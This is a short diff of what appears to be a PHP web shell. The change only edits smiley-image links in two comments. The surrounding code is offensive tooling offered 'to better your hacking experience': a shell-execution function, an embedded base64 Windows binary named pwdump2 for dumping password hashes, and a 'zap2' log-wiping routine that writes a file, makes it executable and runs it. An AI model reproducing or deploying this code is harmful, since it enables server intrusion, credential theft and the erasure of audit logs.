@@ -88,7 +88,7 @@ function myshellexec($cmd)
 }
 }
 }
-// all the base64-encoded crap comes next.  they include programs and exploits, to better your hacking experience <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />
+// all the base64-encoded crap comes next.  they include programs and exploits, to better your hacking experience <img src="/HackingScripts/wp-includes/images/smilies/icon_wink.gif" alt=";)" class="wp-smiley" />
 $pwdump2="TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAA0AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
 ZGUuDQ0KJAAAAAAAAABe6Dg9GolWbhqJVm4aiVZu8pZdbhuJVm6ZlVhuF4lWbkOqRW4fiVZuGolX
@@ -5715,7 +5715,7 @@ else
 // the wipe logs stuff needs to be before cmd, because it will change the $act if the write is successful
 if ($act == 'zap2') { // *nix cleaner
     if (is_writable('.')) {
-        cf($act, $$act); // 'tis pure innovation of optimization <img src="http://hackingscripts.com/wp/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
+        cf($act, $$act); // 'tis pure innovation of optimization <img src="/HackingScripts/wp-includes/images/smilies/icon_smile.gif" alt=":)" class="wp-smiley" />
         chmod($act, 0777);
         $cmd = './'.$act; // keep this before $act = 'cmd';
         $act = 'cmd';
